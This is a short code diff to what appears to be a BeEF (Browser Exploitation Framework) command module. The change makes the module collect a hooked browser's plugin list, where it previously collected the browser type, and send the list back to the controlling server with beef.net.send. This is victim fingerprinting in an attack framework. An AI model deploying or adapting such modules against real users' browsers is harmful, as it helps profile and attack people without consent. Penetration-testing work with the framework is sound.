@@ -49,8 +49,8 @@ function serialize(_obj)
          break;
 	}
 }
+
+	var plugins = beef.browser.getPlugins();
 	
-	var browser_type = serialize(beef.browser.type());
-    
-    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'browser_type='+browser_type);
+    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'plugins='+plugins);
 });
